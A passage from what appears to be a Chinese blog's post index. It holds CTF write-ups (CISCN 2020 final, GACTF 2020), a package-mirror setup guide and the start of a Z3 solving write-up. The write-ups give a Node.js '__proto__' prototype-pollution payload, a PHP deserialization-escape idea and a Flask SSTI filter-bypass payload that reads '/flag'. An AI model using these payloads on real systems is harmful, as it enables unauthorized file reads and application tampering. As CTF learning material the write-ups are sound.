keepTwoDecimal(monster.HP) } function monsterAttackPlayer() { if (monster.buff) { player.HP -= (monster.aggressivity + monster.buff) player.HP = keepTwoDecimal(player.HP) return keepTwoDecimal(monster.aggressivity + monster.buff) } else { player.HP -= monster.aggressivity player.HP = keepTwoDecimal(player.HP) return monster.aggressivity } } //...... app.post('/start', (req, res) =&gt; { if (req.body &amp;&amp; typeof req.body== 'object' ) { player = { name : \"ciscn\", career : \"warrior\", item : \"BYZF\", round_to_use : 1 //round_to_use表示在哪一轮使用物品 } let tempPlayer = req.body for ( let i in tempPlayer ) { if (player[i]) { if ( (i == 'career' &amp;&amp; !careers.includes(tempPlayer[i])) || (i == 'item' &amp;&amp; !items.includes(tempPlayer[i])) || (i == 'round_to_use' &amp;&amp; !checkRound(tempPlayer[i])) || tempPlayer[i] === '') { continue } player[i] = tempPlayer[i] } } player.num = 1; //player剩余可`使用物品`的次数 player.HP = 100; //HP为血量 player.aggressivity = getPlayerAggressivity() initMonster() res.redirect(\"/battle\") } else { res.redirect(\"/\") } }) app.get('/battle', (req, res)=&gt;{ if ( player.HP !== 100 ) { res.status(403).end(\"Forbidden\") return } let battleLog = [] let round = 1; do { battleLog.push(`&lt;font color=\"red\" size=\"5px\"&gt;Round &lt;B&gt;${round}&lt;/B&gt; fight!&lt;/font&gt;`) player.aggressivity = getPlayerAggressivity(); battleLog.push(`${playerAndMonsterInfo()}玩家&lt;B&gt;${player.name}&lt;/B&gt;攻击力为&lt;B&gt;${getPlayerDamageValue()}&lt;/B&gt;!`) switch (playerUseItem(round)) { case 0: break case 1: battleLog.push(`玩家&lt;B&gt;${player.name}&lt;/B&gt;使用了物品&lt;B&gt;治疗药膏&lt;/B&gt;! 玩家生命值+10！`) break case 2: battleLog.push(`玩家&lt;B&gt;${player.name}&lt;/B&gt;使用了物品&lt;B&gt;白银之锋&lt;/B&gt;! 即将造成130%暴击！`) break case 3: battleLog.push(`玩家&lt;B&gt;${player.name}&lt;/B&gt;使用了物品&lt;B&gt;邪恶镰刀&lt;/B&gt;! &lt;B&gt;地穴领主&lt;/B&gt;的攻击力变为了80%！`) break } if (round === 1) { switch (triggerPassiveSkill()) { case 1: battleLog.push(`玩家&lt;B&gt;${player.name}&lt;/B&gt;触发了&lt;B&gt;战神领主&lt;/B&gt;的被动技能&lt;B&gt;旋风飞斧&lt;/B&gt;! 下次攻击的攻击力+5！`) break case 2: battleLog.push(`玩家&lt;B&gt;${player.name}&lt;/B&gt;触发了&lt;B&gt;奥术祭司&lt;/B&gt;的被动技能&lt;B&gt;巫毒恢复&lt;/B&gt;! 玩家&lt;B&gt;${player.name}&lt;/B&gt;的生命值+10！`) break case 3: battleLog.push(`玩家&lt;B&gt;${player.name}&lt;/B&gt;触发了&lt;B&gt;暗夜游侠&lt;/B&gt;的被动技能&lt;B&gt;百步穿杨&lt;/B&gt;! 下次攻击的攻击力+7！`) } } playerAttackMonster() battleLog.push(`玩家&lt;B&gt;${player.name}&lt;/B&gt;攻击了&lt;B&gt;地穴领主&lt;/B&gt;并造成&lt;B&gt;${getPlayerDamageValue()}&lt;/B&gt;点伤害! &lt;B&gt;地穴领主&lt;/B&gt;剩余血量为&lt;B&gt;${monster.HP}&lt;/B&gt;`) if (monster.HP &lt;= 0) { battleLog.push(' ') break } if (monsterPassiveSkill()){ battleLog.push(`&lt;B&gt;地穴领主&lt;/B&gt;触发了被动技能&lt;B&gt;缩地&lt;/B&gt;！生命值回复20点！回复后生命值为&lt;B&gt;${monster.HP}&lt;/B&gt;`) } battleLog.push(`&lt;B&gt;地穴领主&lt;/B&gt;攻击了玩家&lt;B&gt;${player.name}&lt;/B&gt;并造成&lt;B&gt;${monsterAttackPlayer()}&lt;/B&gt;点伤害! 玩家&lt;B&gt;${player.name}&lt;/B&gt;剩余血量为&lt;B&gt;${player.HP}&lt;/B&gt;`) monster.aggressivity = 40; monster.buff = 0; player.buff = 0; round++ battleLog.push(' ') } while (player.HP &gt; 0 &amp;&amp; monster.HP &gt; 0) if (player.HP &gt; monster.HP) { battleLog.push(\"恭喜你胜利了！这是给你的奖励：\" + flag) } else { battleLog.push(\"很遗憾，你被打败了，但是不要灰心，再接再厉\") } player = monster = {} res.render(\"result\", {\"result_5be4038eaf61b1b7abad92cfece05cd7\" : battleLog.join(\"&lt;br /&gt;\\n\")}) }) 出 flag 需要 player.HP &gt; monster.HP，但不能直接改 player.HP。 不过可以加大 buff，再看源码中这一部分。 for ( let i in tempPlayer ) { if (player[i]) { if ( (i == 'career' &amp;&amp; !careers.includes(tempPlayer[i])) || (i == 'item' &amp;&amp; !items.includes(tempPlayer[i])) || (i == 'round_to_use' &amp;&amp; !checkRound(tempPlayer[i])) || tempPlayer[i] === '') { continue } player[i] = tempPlayer[i] } } 这里把接收到的 tempPlayer 这个 object 中的 value 不为空内容都赋给 player 了。 于是我们可以通过污染原型链，把 buff 改大。 大师傅有言： 原型污染，虽然不能污染到真正的原型，但是可以替换 player 对象的原型到我们的恶意对象，将 buff 搞成一个特别大的值就能秒杀 boss。 Payload: { \"name\": \"asdasd\", \"round_to_use\": 1, \"career\": \"high_priest\", \"item\": \"ZLYG\", \"__proto__\": { \"buff\": 1000 } } Web3反序列化逃逸 lib.php 部分源码 User 类 private function waf($string) { $waf = '/phar|file|gopher|http|sftp|flag/i'; return preg_replace($waf, 'index', $string); } private function check_data($data) { foreach( $data as $key =&gt; $value) { if ( is_array($value) ) return $this-&gt;check_data($value); if ( is_object($value) &amp;&amp; $value instanceof User) { $data_avatar = $value-&gt;get_avatar(); if ( is_string($data_avatar) &amp;&amp; !empty($data_avatar)) { $content = file_get_contents(__DIR__ . \"/\" . $data_avatar); $png_header = \"\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A\\x00\\x00\\x00\\x0D\\x49\\x48\\x44\\x52\"; if (strpos($content, $png_header) === false ) { throw new Exception(\"png content got an unexpected Exception\"); } } } } return true; } public function update($profile) { $data = unserialize($this-&gt;waf($profile)); if ($data[\"old_password\"] !== $data[\"old_real_password\"] ) return $this-&gt;check_data($data); $this-&gt;password = $data[\"password\"]; $this-&gt;age = $data[\"age\"]; $this-&gt;email = $data[\"email\"]; } //...... function __destruct() { if ( isset($this-&gt;username) &amp;&amp; isset($this-&gt;password) &amp;&amp; isset($this-&gt;age) &amp;&amp; isset($this-&gt;email) &amp;&amp; isset($this-&gt;avatar) &amp;&amp; isset($this-&gt;content) &amp;&amp; is_string($this-&gt;avatar) &amp;&amp; !empty($this-&gt;avatar) &amp;&amp; !preg_match('/\\:\\/\\//', $this-&gt;avatar) ) { $this-&gt;content = file_get_contents(__DIR__ . \"/\" . $this-&gt;avatar); $res = \"&lt;script&gt;\\nvar img = document.createElement(\\\"img\\\");\\nimg.src= \\\"data:image/png;base64,content\\\";\\nimg.alt = \\\"user\\\";\\ndocument.getElementById(\\\"pro-avatar\\\").append(img);\\n&lt;/script&gt;\"; $res = str_replace(\"content\", base64_encode($this-&gt;content), $res); echo $res; } } dashboard.php 部分源码 if (isset($_POST[\"old_password\"]) &amp;&amp; isset($_POST[\"update_password\"]) &amp;&amp; isset($_POST[\"update_age\"]) &amp;&amp; isset($_POST[\"update_email\"]) &amp;&amp; is_string($_POST[\"old_password\"]) &amp;&amp; is_string($_POST[\"update_password\"]) &amp;&amp; is_string($_POST[\"update_age\"]) &amp;&amp; is_string($_POST[\"update_email\"]) ) { if ( preg_match('/[^\\d]/', $_POST[\"update_age\"]) || !filter_var($_POST[\"update_email\"], FILTER_VALIDATE_EMAIL) || strlen($_POST[\"update_password\"]) &gt; 16 || preg_match('/\\W/', $_POST[\"update_password\"]) ) $user-&gt;alertMes(\"invalid information\", \"./dashboard.php\"); $update_profile = array ( \"old_password\" =&gt; $_POST[\"old_password\"], \"old_real_password\" =&gt; $user-&gt;password, \"password\" =&gt; $_POST[\"update_password\"], \"age\" =&gt; $_POST[\"update_age\"], \"email\" =&gt; $_POST[\"update_email\"] ); $user-&gt;update(serialize($update_profile)); } 应该是调用User类的update方法时经过 waf 和 unserialize 时存在反序列化漏洞。 大老鼠有言： waf() 造成序列化的字符串长度改变，就可以提前截断了 逃逸出来一个user对象就行了 u1s1，PHP 是世界上最好的语言，这题后面再看看来复现8（咕咕咕 （先溜了喵","path":"2020/10/06/CTF_2020CISCN_final/"},{"title":"环境搭建之更换软件源汇总(Ubuntu/pip/Anaconda/Docker等)","text":"前言众所周知，很多官方软件源默认都在国外，在国内下载不是一般的慢…… 于是我们想到了通过国内的镜像站，来加速访问或下载等。 最近搭建环境，又折腾了一堆换源，于是又到处找觉得挺麻烦的。 正好这次就来汇总一下各种常用的换源好了。 系统 apt 换源以 Ubuntu 为例： 首先备份原文件 sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak （有可能需要修改文件权限为可编辑） sudo chmod 777 /etc/apt/sources.list 而后编辑文件 sudo vim /etc/apt/sources.list # 或 sudo gedit /etc/apt/sources.list 都没有的话可以先装个编辑器，或者 sudo echo \"balabala\" &gt; /etc/apt/sources.list 其中的 balabala 是下面的内容。 清华 tuna 源 详见 https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ 本镜像仅包含 32/64 位 x86 架构处理器的软件包，在 ARM(arm64, armhf)、PowerPC(ppc64el)、RISC-V(riscv64) 和 S390x 等架构的设备上（对应官方源为ports.ubuntu.com）请使用 ubuntu-ports 镜像。 Ubuntu 18.04 LTS# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse Ubuntu 16.04 LTS# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse Ubuntu 20.04 LTS# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse Ubuntu Ports 本镜像仅包含 arm64 armhf ppc64el riscv64 s390x 架构的软件包。 （比如在 NVIDIA Jetson TX2 等嵌入式系统上跑的） Ubuntu 18.04 LTS: # 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释 deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse # 预发布软件源，不建议启用 # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-proposed main restricted universe multiverse 其他版本也类似，加个 /ubuntu-ports/ 即可。 Alpine Linux在终端执行下面的语句。 sed -i 's/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g' /etc/apk/repositories 阿里源Ubuntu 18.04 LTSdeb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse 163源Ubuntu 18.04 LTSdeb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse 换好源后更新源 sudo apt-get update 修复损坏的软件包，尝试卸载出错的包，重新安装正确版本的。 sudo apt-get -f install 更新软件 sudo apt-get upgrade 或者安装软件…… Pypi (pip) 换源清华 tuna 源临时安装时： pip install -i https://pypi.tuna.tsinghua.edu.cn/simple some-package some-package 为模块名。 设为默认： pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pip -U pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple 或者，Linux 或 MacOS 下修改 ~/.pip/pip.conf ，若没有此文件则创建一个新的。 mkdir ~/.pip cd ~/.pip vim pip.conf Windows 下： 文件管理器文件路径地址栏敲：%HOMEPATH% 回车，快速进入 C:\\Users\\用户名\\ 文件夹中（用户目录） 新建 pip 文件夹并在文件夹中新建 pip.ini 配置文件 新增 pip.ini 配置文件内容 文件内容如下。 [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] use-mirrors = true mirrors = https://pypi.tuna.tsinghua.edu.cn/simple trusted-host = pypi.tuna.tsinghua.edu.cn 其他源 清华：https://pypi.tuna.tsinghua.edu.cn/simple 阿里云：https://mirrors.aliyun.com/pypi/simple 中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple 豆瓣：https://pypi.douban.com/simple/ Anaconda 换源 参考 https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/ Anaconda 安装包可以到 https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/ 下载。 TUNA 还提供了 Anaconda 仓库与第三方源（conda-forge、msys2、pytorch等，查看完整列表）的镜像，各系统都可以通过修改用户目录下的 .condarc 文件。Windows 用户无法直接创建名为 .condarc 的文件，可先执行 conda config --set show_channel_urls yes 生成该文件之后再修改。 channels: - defaults show_channel_urls: true channel_alias: https://mirrors.tuna.tsinghua.edu.cn/anaconda default_channels: - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/pro - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2 custom_channels: conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud 即可添加 Anaconda Python 免费仓库。 运行 conda clean -i 清除索引缓存，保证用的是镜像站提供的索引。 运行 conda create -n myenv numpy 测试一下吧。 或者 conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ # 设置搜索时显示通道地址 conda config --set show_channel_urls yes conda 额外库： # pytorch conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/ # 安装时PyTorch，官网给的安装命令需要去掉最后的-c pytorch，才能使用清华源 # conda-forge conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/ # msys2 conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/ # bioconda conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/bioconda/ # menpo conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/menpo/ # 设置搜索时显示通道地址 conda config --set show_channel_urls yes Docker 换源 参考之前写的 Docker 安装及常用命令。 编辑文件Linux 下，编辑此文件，如果没有则新建。 sudo vim /etc/docker/daemon.json Windows 下文件为 %programdata%\\docker\\config\\daemon.json 内容可以为多个镜像 { \"registry-mirrors\": [ \"https://docker.mirrors.ustc.edu.cn\", \"https://dockerhub.azk8s.cn/\", \"http://hub-mirror.c.163.com\" ] } 配置完之后重启服务sudo systemctl daemon-reload sudo systemctl restart docker 检查是否生效docker info 看最后的 Registry Mirrors 里有没有添加成功。 大概就先收集这么多吧（","path":"2020/09/25/Server_ChangeSource/"},{"title":"CTF | 2020 GACTF 一点点WriteUp","text":"引言这几天有个 GACTF，本来这几天有点事情没打算来看的，结果队里师傅突然扔来个代码，还以为是帮 debug，后来才发现是个 CTF 题目。。（坏耶 于是随意来看看题目了，就佛系做了几个题嘤嘤嘤，顺便来学点东西就是了。 Misccrymisc 8.25 is Chinese Valentine’s Day.Yesterday my brother told me he was refused by a beautiful girl.He was sooooooooooooo sad and bursted into tears.链接：https://pan.baidu.com/s/1EZzhnAa5Q4OD8y-YEAcjzQ提取码：866hhttps://drive.google.com/drive/folders/1gDfMBrtqwvi7f9BaB1ixjogeLDascjED?usp=sharing 下载下来一个 crymisc.docx，一看打不开果然改成 zip，发现有伪加密。 1.txt 内容为： I'm going to tell her how i feel.DO YOU WANT TO KNOW WHAT I TOLD HER? 另外是一张图片，发现结尾有东西，至少有个压缩包。 提取出来。 SSB3YXMgcmVqZWN0ZWQuLi4uLi5USElTIElTIFRIRSBQQVNTV09SRDpJIFdhbm5hIENyeXl5ISEh 首先对上面这段 base64，得到压缩包密码。 I was rejected......THIS IS THE PASSWORD:I Wanna Cryyy!!! 压缩包需要先补上文件头，即变成 504B0304… 拿密码去解压，文件内容如下。 🔭💙🐰✊🌻🐧💙😘🌻🍶💐🍌🏊🍩🚁🏊👹🐶😀🐶😀😘👹💙🍂💇😀😀😩🌻🍟👂🍶💐🍌🏊🍩👆🏠🙇🍂🍂👼😱🚔🐶👉✊😱🏠🙇🍂🍂👼😱🚊😧💨💙💕 That is what i told her↑↑↑ 什么，您就是抽象带师？ 想起来在 BJD3rd 里 TaQini 师傅就出过一题，就是 Manual 这题的一部分。 参考那题的思路，盲猜就是 Codemoji 了！根据提示key应该就是个哭的表情吧，就😭这个了。 P.S.: codemoji GitHub repo (Mozilla Public License 2.0) 好耶，咱也部署一个！ 就在这里了！-&gt; https://codemoji.miaotony.xyz 欢迎来玩呀（ 于是构造 payload 如下： {\"message\":\"🔭💙🐰✊🌻🐧💙😘🌻🍶💐🍌🏊🍩🚁🏊👹🐶😀🐶😀😘👹💙🍂💇😀😀😩🌻🍟👂🍶💐🍌🏊🍩👆🏠🙇🍂🍂👼😱🚔🐶👉✊😱🏠🙇🍂🍂👼😱🚊😧💨💙💕\",\"key\":\"😭\"} base64encode + URLencode： eyJtZXNzYWdlIjoi8J%2BUrfCfkpnwn5Cw4pyK8J%2BMu%2FCfkKfwn5KZ8J%2BYmPCfjLvwn4228J%2BSkPCfjYzwn4%2BK8J%2BNqfCfmoHwn4%2BK8J%2BRufCfkLbwn5iA8J%2BQtvCfmIDwn5iY8J%2BRufCfkpnwn42C8J%2BSh%2FCfmIDwn5iA8J%2BYqfCfjLvwn42f8J%2BRgvCfjbbwn5KQ8J%2BNjPCfj4rwn42p8J%2BRhvCfj6Dwn5mH8J%2BNgvCfjYLwn5G88J%2BYsfCfmpTwn5C28J%2BRieKcivCfmLHwn4%2Bg8J%2BZh%2FCfjYLwn42C8J%2BRvPCfmLHwn5qK8J%2BYp%2FCfkqjwn5KZ8J%2BSlSIsImtleSI6IvCfmK0ifQ%3D%3D 而后丢去解密。 https://codemoji.miaotony.xyz/share.html?data=eyJtZXNzYWdlIjoi8J%2BUrfCfkpnwn5Cw4pyK8J%2BMu%2FCfkKfwn5KZ8J%2BYmPCfjLvwn4228J%2BSkPCfjYzwn4%2BK8J%2BNqfCfmoHwn4%2BK8J%2BRufCfkLbwn5iA8J%2BQtvCfmIDwn5iY8J%2BRufCfkpnwn42C8J%2BSh%2FCfmIDwn5iA8J%2BYqfCfjLvwn42f8J%2BRgvCfjbbwn5KQ8J%2BNjPCfj4rwn42p8J%2BRhvCfj6Dwn5mH8J%2BNgvCfjYLwn5G88J%2BYsfCfmpTwn5C28J%2BRieKcivCfmLHwn4%2Bg8J%2BZh%2FCfjYLwn42C8J%2BRvPCfmLHwn5qK8J%2BYp%2FCfkqjwn5KZ8J%2BSlSIsImtleSI6IvCfmK0ifQ%3D%3D 得到flag。 WelcometoGACTF!ThisisthepasswordGACTF{H4ppy_Mi5c_H4ppy_L1fe} Websimpleflask 题目每10分钟重启，如遇到无法连接，请稍等片刻10秒左右会全部重启完毕 This topic restart every 10 minitues. If you can’t connect, please wait for a while and the restart will be completed. Do not panic China： 124.70.153.63 80-89 Overseas： 149.28.80.82 80-89 POST 访问，提示 request.form[\"name\"]。 带上参数 name，尝试 SSTI，发现有戏。 某次利用报错看到了部分源码。 除了过滤了flag，在这个check函数里还过滤了许多，尝试发现，包括但不限于 os, system, pwd, popen, eval, import, request, mro, ', %, +, ,, （空格）, |, \\x 等等关键字或符号都被滤掉了…… 单引号不行，但双引号可行，发现利用 \"op\"\"en\" 的形式拼接字符串可行。 本来想找 PIN 的，但试了试所需的信息整不来（好菜啊），可以参考 Flask debug pin安全问题 这一篇文章。 于是又整了半天绕过…… 首先拿到 object。 一顿操作拿到 __builtins__。 发现chr之类的函数并没有，然而并不能用 {% xxx %} 来设置就很难受。 本来想用 os.popen 这一模块来执行命令读取信息的，但不知道为啥read()就被拦了。 最后问了队里大师傅，发现换成open就完事了，太草了！ Payload: name={{[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__[\"op\"\"en\"](\"/fl\"\"ag\").read()}} GACTF{fac9165b6a2b5ac8bd3b99fad0619366} 后面再整理一下 flask 的 SSTI 常用 payload 及绕过技巧吧（ 大概率会咕咕咕（ EZFLASK flask&amp;flask China： 124.70.206.91 10000-10009 Overseas： 149.28.226.175 10000-10009 # -*- coding: utf-8 -*- from flask import Flask, request import requests from waf import * import time app = Flask(__name__) @app.route('/ctfhint') def ctf(): hint =xxxx # hints trick = xxxx # trick return trick @app.route('/') def index(): # app.txt @app.route('/eval', methods=[\"POST\"]) def my_eval(): # post eval @app.route(xxxxxx, methods=[\"POST\"]) # Secret def admin(): # admin requests if __name__ == '__main__': app.run(host='0.0.0.0',port=8080) 他这个 flask 服务器为 Werkzeug/1.0.1 Python/2.7.18。 访问 /ctfhint，得到 too young too simple POST /eval post eval 没找到哪里能用？ admin 没找到 route 在哪，并不知道怎么用 emmm。 （等复现嘤嘤嘤 大概就这么多，开学了喵呜~ （溜了溜了","path":"2020/08/31/CTF_2020GACTF/"},{"title":"CTF | 2020 CISCN初赛 Z3&LFSR WriteUp","text":"引言喵呜，好久没来写博客了咕咕咕（这就来除草了！ 前不久水了一波 CISCN 线上初赛，感谢队友带我玩带我飞~ 这里来写一写 Z3、LFSR 这两题的 WriteUp，顺便记录一下用到的 Z3、SageMath 求解工具喵。 Z3首先丢进 IDA 看一看，首先将输入的 flag 分别存放在 v46 到 v87 变量内，而后是这些变量组成的线性方程，最后与 Dst 的结果比较，正确则输出 win。 其中Dst及其之后对应的那部分空间就是方程的值，将数据抠出来求解就完事了！ 本来想用 MATLAB 之类来求解的，但看到题目名字叫 z3，搜了一下，果然有个叫 z3 的求解器，于是直接用它来约束求解即可。 而且这个 z3 还挺强大的亚子。。 from z3 import * solver = Solver() v46 = Int('flag[0]') v47 = Int('flag[1]') v48 = Int('flag[2]') v49 = Int('flag[3]') v50 = Int('flag[4]') v51 = Int('flag[5]') v52 = Int('flag[6]') v53 = Int('flag[7]') v54 = Int('flag[8]') v55 = Int('flag[9]') v56 = Int('flag[10]') v57 = Int('flag[11]') v58 = Int('flag[12]') v59 = Int('flag[13]') v60 = Int('flag[14]') v61 = Int('flag[15]') v62 = Int('flag[16]') v63 = Int('flag[17]') v64 = Int('flag[18]') v65 = Int('flag[20]') v66 = Int('flag[21]') v67 = Int('flag[22]') v68 = Int('flag[23]') v69 = Int('flag[24]') v70 = Int('flag[25]') v71 = Int('flag[26]') v72 = Int('flag[27]') v73 = Int('flag[28]') v74 = Int('flag[29]') v75 = Int('flag[30]') v76 = Int('flag[31]') v77 = Int('flag[32]') v78 = Int('flag[33]') v79 = Int('flag[34]') v80 = Int('flag[35]') v81 = Int('flag[36]') v82 = Int('flag[37]') v83 = Int('flag[38]') v84 = Int('flag[39]') v85 = Int('flag[40]') v86 = Int('flag[41]') v87 = Int('flag[42]') solver.add(v46 &gt; 0) solver.add(v46 &lt; 128) solver.add(v47 &gt; 0) solver.add(v47 &lt; 128) solver.add(v48 &gt; 0) solver.add(v48 &lt; 128) solver.add(v77 &gt; 0) solver.add(v77 &lt; 128) solver.add(v78 &gt; 0) solver.add(v78 &lt; 128) solver.add(v79 &gt; 0) solver.add(v79 &lt; 128) solver.add(v76 &gt; 0) solver.add(v76 &lt; 128) solver.add(34 * v49 + 12 * v46 + 53 * v47 + 6 * v48 + 58 * v50 + 36 * v51 + v52 == 0x4f17) solver.add(27 * v50 + 73 * v49 + 12 * v48 + 83 * v46 + 85 * v47 + 96 * v51 + 52 * v52 == 0x9cf6) solver.add(24 * v48 + 78 * v46 + 53 * v47 + 36 * v49 + 86 * v50 + 25 * v51 + 46 * v52 == 0x8ddb) solver.add(78 * v47 + 39 * v46 + 52 * v48 + 9 * v49 + 62 * v50 + 37 * v51 + 84 * v52 == 0x8ea6) solver.add(48 * v50 + 14 * v48 + 23 * v46 + 6 * v47 + 74 * v49 + 12 * v51 + 83 * v52 == 0x6929) solver.add(15 * v51 + 48 * v50 + 92 * v48 + 85 * v47 + 27 * v46 + 42 * v49 + 72 * v52 == 0x9911) solver.add(26 * v51 + 67 * v49 + 6 * v47 + 4 * v46 + 3 * v48 + 68 * v52 == 0x40a2) solver.add(34 * v56 + 12 * v53 + 53 * v54 + 6 * v55 + 58 * v57 + 36 * v58 + v59 == 0x2f3e) solver.add(27 * v57 + 73 * v56 + 12 * v55 + 83 * v53 + 85 * v54 + 96 * v58 + 52 * v59 == 0x62b6) solver.add(24 * v55 + 78 * v53 + 53 * v54 + 36 * v56 + 86 * v57 + 25 * v58 + 46 * v59 == 